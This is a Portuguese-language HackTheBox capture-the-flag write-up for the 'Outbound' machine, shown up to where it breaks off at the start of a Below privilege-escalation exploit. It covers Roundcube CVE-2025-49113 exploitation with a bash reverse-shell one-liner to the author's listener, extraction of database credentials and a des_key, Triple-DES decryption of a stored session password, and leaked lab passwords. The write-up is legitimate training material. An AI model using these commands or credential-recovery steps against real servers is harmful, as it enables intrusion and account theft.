---
title: Outbound HTB Write-up
created: 2025-11-04 23:27
tags:
  - assumedbreach
  - ctf
  - hackthebox
  - walkthrough
  - roundcube
  - CVE-2025-49113
  - CVE-2025-27591
draft: true
---

# Subtítulo da horinha

![[Outbound.png  | Na imagem um homem de terno azul e gravata vermelha grita em um megafone. Abaixo está escrito o nome da máquina: Outbound]]

## Introdução

Olá mundo! Tudo bem? Já se perguntou sobre qual seria o perigo de usar um programa desatualizado? E se esse programa estivesse rodando apenas em Localhost, será que ainda existe perigo? Isso é o que nós vamos ver nessa nova aventura hacker! Hoje vou compartilhar como foi minha experiência com a máquina `Outbound` do hackthebox.

`Outbound` é uma máquina `assumed breach` classificada como **fácil** onde temos um `Roundcube webmail` vulnerável à `CVE‑2025‑49113 – Post‑Auth Remote Code Execution in Roundcube via PHP Object Deserialization`. Após a exploração nós conseguimos obter acesso ao servidor de email e aos arquivos de configuração. Nesses arquivos encontramos as credenciais do `mysql`, onde posteriormente vamos encontrar uma variável de sessão que, depois de decriptada, nos dará as credenciais do usuário `jacob` no servidor de email. Já como `jacob` obtemos acesso aos seus emails, sendo que um deles nos dá a senha que precisamos para nos conectar via [[SSH]]. Para a escalação de privilégios, nos aproveitamos de uma falha grave no programa `Below`, comprometendo totalmente a segurança do servidor principal.

Sem mais, vamos aos detalhes.

## Reconhecimento

### Nmap

Primeiramente eu rodei o NMAP para descobrir quais portas estavam abertas.

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Outbound]
└─$ ports=$(nmap -p- --min-rate=1000 -T4 $IP | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
sudo nmap -Pn -p$ports -sC -sV -oA nmap/$machine -vv $IP
[sudo] password for kali:
Completed NSE at 16:36, 0.00s elapsed
Nmap scan report for 10.10.11.77
Host is up, received user-set (0.21s latency).
Scanned at 2025-11-04 16:35:50 -03 for 13s

PORT      STATE  SERVICE REASON         VERSION
22/tcp    open   ssh     syn-ack ttl 63 OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBN9Ju3bTZsFozwXY1B2KIlEY4BA+RcNM57w4C5EjOw1QegUUyCJoO4TVOKfzy/9kd3WrPEj/FYKT2agja9/PM44=
|   256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIH9qI0OvMyp03dAGXR0UPdxw7hjSwMR773Yb9Sne+7vD
80/tcp    open   http    syn-ack ttl 63 nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://mail.outbound.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
1359/tcp  closed ftsrv   reset ttl 63
7380/tcp  closed unknown reset ttl 63
27435/tcp closed unknown reset ttl 63
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 16:36
Completed NSE at 16:36, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.10 seconds
           Raw packets sent: 5 (220B) | Rcvd: 5 (208B)
```

O `Nmap` mostrou que havia apenas duas portas abertas e três fechadas. Entre as portas abertas temos um `OpenSSH 9.6p1` na porta 22 [[SSH]] e um webserver `nginx 1.24.0` na porta 80 [[HTTP]]. O webserver também redirecionou para o domínio `mail.outbound.htb`. Por isso eu adicionei ao meu arquivo `/etc/hosts`.

### Webmail Login

![[out-0.png  | A imagem mostra a tela de login do Roundcube webmail]]

Visitando a página `http` me deparo com o login de um `Roundcube webmail`. Visto que essa máquina é `assumed breach`, eu recebi antecipadamente as credenciais de acesso inicial. Você pode vê-las na página do hackthebox referente à máquina.

```plaintext
As is common in real life pentests, you will start the Outbound box with credentials for the following account tyler / LhKL1o9Nm3X2
```

Usando o usuário **tyler** e senha **LhKL1o9Nm3X2**, obtive acesso aos e-mails do `tyler`. 

![[out-1.png | A imagem mostra a caixa de entrada de e-mails do usuário tyler]]

Mas infelizmente estava vazio. Não havia mensagens e parecia não haver nenhuma pista para o próximo passo. No entanto quando olhei na aba "**About**", pude ver a versão do webmail- `1.6.10`.

![[out-2.png | A imagem mostra a versão   do webmail]]

Pesquisando por vulnerabilidades nessa versão eu encontrei meu bilhete dourado. Uma vulnerabilidade chamada `CVE‑2025‑49113 – Post‑Auth Remote Code Execution in Roundcube via PHP Object Deserialization`, falha crítica pontuada como `9.9` no [[CVSS]].

## Acesso Inicial

### Explorando a CVE‑2025‑49113

>[!info] CVE‑2025‑49113
>**CVE‑2025‑49113** é uma falha crítica em Roundcube Webmail que permite a um usuário autenticado executar código no servidor (RCE) explorando uma falha de validação do parâmetro *_from* em *program/actions/settings/upload.php*.
>Imagine que o servidor recebe um “pacote” com dados serializados e, ao “desempacotar”, ele automaticamente executa instruções contidas nesse pacote. A vulnerabilidade permite corromper uma variável de sessão via parâmetro _from e injetar um objeto PHP malicioso que é desserializado e executado no servidor. Em termos práticos: um usuário com credenciais válidas pode fazer o servidor executar código arbitrário.
>Uma explicação detalhada está nesse [site](https://fearsoff.org/research/roundcube). Ler esse artigo me ajudou com a fase mais a frente.

Atualmente há vários scripts públicos que automatizam o processo de exploração. Eu usei esse [aqui](https://github.com/fearsoff-org/CVE-2025-49113). Primeiro deixei meu **listener** ativo na porta **9001**. Daí executei o script como segue abaixo:

```bash
┌──(kali㉿kali)-[~/…/Hackthebox/Easy/Outbound/scripts]
└─$ php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 'bash -c "bash -i >& /dev/tcp/10.10.14.27/9001 0>&1"'
### Roundcube ≤ 1.6.10 Post-Auth RCE via PHP Object Deserialization [CVE-2025-49113]

### Retrieving CSRF token and session cookie...

### Authenticating user: tyler

### Authentication successful

### Command to be executed:
bash -c "bash -i >& /dev/tcp/10.10.14.27/9001 0>&1"

### Injecting payload...

### End payload: http://mail.outbound.htb/?_from=edit-%21%C8%22%C8%3B%C8i%C8%3A%C80%C8%3B%C8O%C8%3A%C81%C86%C8%3A%C8%22%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%22%C8%3A%C81%C8%3A%C8%7B%C8S%C8%3A%C82%C86%C8%3A%C8%22%C8%5C%C80%C80%C8C%C8r%C8y%C8p%C8t%C8_%C8G%C8P%C8G%C8_%C8E%C8n%C8g%C8i%C8n%C8e%C8%5C%C80%C80%C8_%C8g%C8p%C8g%C8c%C8o%C8n%C8f%C8%22%C8%3B%C8S%C8%3A%C85%C83%C8%3A%C8%22%C8b%C8a%C8s%C8h%C8+%C8-%C8c%C8+%C8%22%C8b%C8a%C8s%C8h%C8+%C8-%C8i%C8+%C8%3E%C8%26%C8+%C8%2F%C8d%C8e%C8v%C8%2F%C8t%C8c%C8p%C8%2F%C81%C80%C8%5C%C82%C8e%C81%C80%C8%5C%C82%C8e%C81%C84%C8%5C%C82%C8e%C82%C87%C8%2F%C89%C80%C80%C81%C8+%C80%C8%3E%C8%26%C81%C8%22%C8%3B%C8%23%C8%22%C8%3B%C8%7D%C8i%C8%3A%C80%C8%3B%C8b%C8%3A%C80%C8%3B%C8%7D%C8%22%C8%3B%C8%7D%C8%7D%C8&_task=settings&_framed=1&_remote=1&_id=1&_uploadid=1&_unlock=1&_action=upload

### Payload injected successfully

### Executing payload...
```

No **listener** eu recebi a conexão reversa:

```bash
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Outbound]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.11.77] 53786
bash: cannot set terminal process group (247): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mail:/var/www/html/roundcube/public_html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Notei que o **hostname** era `@mail` e não `@outbound` como vem sendo o padrão das máquinas do Hackthebox. Provavelmente o serviço de e-mail estava rodando de um `docker`. Então eu precisava de uma maneira de escalar privilégios para o servidor principal.

Fiz uma pesquisa simples no **Google** e aprendi que o arquivo de configuração do Roundcube é o `config.inc.php` . Sabendo disso procurei por credenciais de banco de dados nesse arquivo.

```php
<?php

/*
 +-----------------------------------------------------------------------+
 | Local configuration for the Roundcube Webmail installation.           |
 |                                                                       |
 | This is a sample configuration file only containing the minimum       |
 | setup required for a functional installation. Copy more options       |
 | from defaults.inc.php to this file to override the defaults.          |
 |                                                                       |
 | This file is part of the Roundcube Webmail client                     |
 | Copyright (C) The Roundcube Dev Team                                  |
 |                                                                       |
 | Licensed under the GNU General Public License version 3 or            |
 | any later version with exceptions for skins & plugins.                |
 | See the README file for a full license statement.                     |
 +-----------------------------------------------------------------------+
*/

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';

// provide an URL where a user can get support for this Roundcube installation
// PLEASE DO NOT LINK TO THE ROUNDCUBE.NET WEBSITE HERE!
$config['support_url'] = '';

// Name your service. This is displayed on the login screen and in the window title
$config['product_name'] = 'Roundcube Webmail';

// This key is used to encrypt the users imap password which is stored
// in the session record. For the default cipher method it must be
// exactly 24 characters long.
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';

// List of active plugins (in plugins/ directory)
$config['plugins'] = [
    'archive',
    'zipdownload',
];

// skin name: folder from skins/
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';
```

Esse arquivo tem informações muito interessantes. A primeira é sobre as credenciais de acesso ao banco de dados `mysql`.

```php
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';
```

A segunda me tomou várias horas pra entender, mas mais a diante vou abortar esse assunto. Seguindo com meu plano de escape, abri o mysql e procurei pela tabela de usuários. Mas pra minha surpresa a tabela estava assim:

```sql
MariaDB [roundcube]> select userid,username,preferences from users;
ERROR 1054 (42S22): Unknown column 'userid' in 'SELECT'
MariaDB [roundcube]> select user_id,username,preferences from users;
+---------+----------+-----------------------------------------------------------+
| user_id | username | preferences                                               |
+---------+----------+-----------------------------------------------------------+
|       1 | jacob    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | a:2:{s:11:"client_hash";s:16:"cVPY55RhDd47JyRd";i:0;b:0;} |
+---------+----------+-----------------------------------------------------------+
3 rows in set (0.000 sec)
```

Haviam outras colunas nessa tabela, e nenhuma delas era relacionada à senhas ou hashes de senhas. No entanto, antes de eu desistir da idéia de conseguir credenciais no banco de dados, notei outra tabela próxima à tabela de usuários, chamada `session`.

```sql
| searches            |
| session             |
| system              |
| users               |
+---------------------+
```

E por que essa tabela seria importante? No artigo citado antes e que explica a CVE em detalhes, há uma declaração importante:

````plaintext
For example, in MySQL, the data is stored in the **session** table, in the **vars** column, and is presented in this somewhat unusual format:

```
dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZmVhcnNvZmYub3JnIjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRhcmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJhOVFKdkpGQXNrMkduZ1JFclE3SXZBbnkwVldHVkJ6MSI7
```
    This is due to the fact that session data may contain null bytes, for example, in object representations, as well as other control characters. These can sometimes be incompatible with the chosen storage backends. Therefore, the string is encoded in base64 and after decoding, it takes the following form:

```
temp\|b:1;language\|s:5:"en_US";task\|s:5:"login";skin_config\|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}request_token\|s:32:"a9QJvJFAsk2GngRErQ7IvAny0VWGVBz1"
```
````

Então essa tabela `session` pode conter algum dado de login ou outra coisa relacionada à sessão do usuário. Olhando a tabela encontrei essa sequência em base64.

```sql
MariaDB [roundcube]> select * from session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlzdCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.001 sec)
```

Ao decodificar o base64, o resultado foi esse:

```php
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Outbound]
└─$ cat hash | base64 -d
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv6maI9HxDL5GhcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

Era realmente os dados de login de outro usuário! A linha com os dados abaixo mostra isso.

```php
username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/";
```

Mas infelizmente o password `L7Rv00A8TuwJAr67kITxxcSgnIk25Am/` não foi o que eu esperava. Ainda teria uns passos a mais pela frente. E lembra que eu disse que o arquivo de configuração do `Roundcube webmail` tinha duas informações importantes? É agora que a segunda informação se encaixa nesse quebra-cabeça.

### Triple-Des

Entre as últimas linhas do arquivo de configuração, havia um que dizia:

```bash
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';
```

No Roundcube, a senha do usuário [[IMAP]] (ou [[SMTP]]) — ou melhor, a credencial que vai usar para autenticar contra o servidor de e-mail — precisa estar disponível durante a sessão do webmail, porque o Roundcube age como cliente `IMAP/SMTP` para esse usuário. Para evitar armazenar essa senha em texto puro no servidor ou no cookie, ela é **criptografada** com uma chave definida na configuração. Note que o password encontrado não é um `hash` irreversível, mas uma cifra que pode ser decriptada.

Depois de um longo diálogo com meu amigo ChatGPT, usei a ferramenta [CyberChef](https://gchq.github.io/CyberChef/) para obter o password em texto plano. Os passos foram os seguintes:

1. O password está em `Base64`, mas eu o transformei em `Hex` para poder contar os bytes.

![[out-3.png | A imagem mostra o texto em base64 sendo transformado em hexadecimal]]

2. Depois eu separei os 8 primeiros bytes `2f b4 6f d3 40 3c 4e ec`, pois ele seria o `IV`.
3. Coloquei o restante dos bytes `09 02 be bb 90 84 f1 c5 c4 a0 9c 89 36 e4 09 bf` na caixa de input.
4. Escolhi a receita `Triple DES Decrypt` e coloquei os 8 bytes separados no `IV`.  
5. Em **key** coloquei a `des_key` encontrada antes - `rcmail-!24ByteDESkey*Str` em UTF8.

O resultado foi o password em texto plano: `595mO8DmwGeD` como pode-se ver na imagem abaixo.

![[out-4.png | A imagem mostra que o password foi decriptado. A senha em texto plano é 595mO8DmwGeD]]

### E-mail comprometido

Com a senha decriptada eu pude elevar para o usuário `jacob`. No diretório `home` do `jacob`, havia um outro diretório chamado `mail`. Entrando no diretório encontrei um e-mail com uma informação interessante:

```plaintext {23}
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
        id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002 
X-UID: 1
Status:
X-Keywords:
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: gY4Wr3a1evp4

Remember to change your password when you next log into your account.

Thanks!

Tyler
```

Ao que parecia, houve uma mudança de password para o usuário `jacob`. Mas note que o e-mail foi enviado para `jacob@outbound.htb`. Então eu poderia testar esse password no serviço [[SSH]] do servidor principal.

Havia também um segundo e-mail:

```plaintext
From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
        id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status:
X-Keywords:
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel
```

O segundo e-mail deu um vislumbre da escalação de privilégios. Seguindo em frente eu testei o novo password no serviço [[SSH]] e funcionou perfeitamente. A flag do usuário pode ser lida no diretório `/home/jacob`.

```bash {32}
┌──(kali㉿kali)-[~/Boxes/Hackthebox/Easy/Outbound]
└─$ ssh jacob@outbound.htb
jacob@outbound.htb's password:
Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-63-generic x86_64)

 * Documentation:  https://help.ubuntu.com 
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Tue Nov  4 11:05:18 PM UTC 2025

  System load:  0.07              Processes:             282
  Usage of /:   79.2% of 6.73GB   Users logged in:       0
  Memory usage: 18%               IPv4 address for eth0: 10.10.11.77
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Tue Nov  4 22:57:38 2025 from 10.10.14.27
jacob@outbound:~$ cat user.txt
bc9db7dd698c4eb49b5594978e95e55d
```

---

## Escalação de Privilégios

### Below

Ao rodar o comando `sudo -l`, eu descobri que poderia usar o programa `Below` como `root` e sem password.

```bash
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

Pesquisando um pouco encontrei a `CVE-2025-27591 Below Prior to v0.9.0 Local Privilege Escalation via World-Writable Log Directory Symlink Attack` uma vulnerabilidade classificada como `6.8 medium`.

Há também alguns exploits públicos e o que eu usei foi esse [aqui](https://raw.githubusercontent.com/BridgerAlderson/CVE-2025-27591-PoC/refs/heads/main/exploit.py).

Copiei o script python para um arquivo no diretório `/tmp/pr3ach3r`. Daí rodei o script e obtive o controle total do servidor como o usuário `root`.

```bash {28}
jacob@outbound:/tmp/pr3ach3r$ python3 exploit.py 
[*] Checking for CVE-2025-27591 vulnerability...
[+] /var/log/below is world-writable.
[!] /var/log/below/error_root.log is a regular file. Removing it...
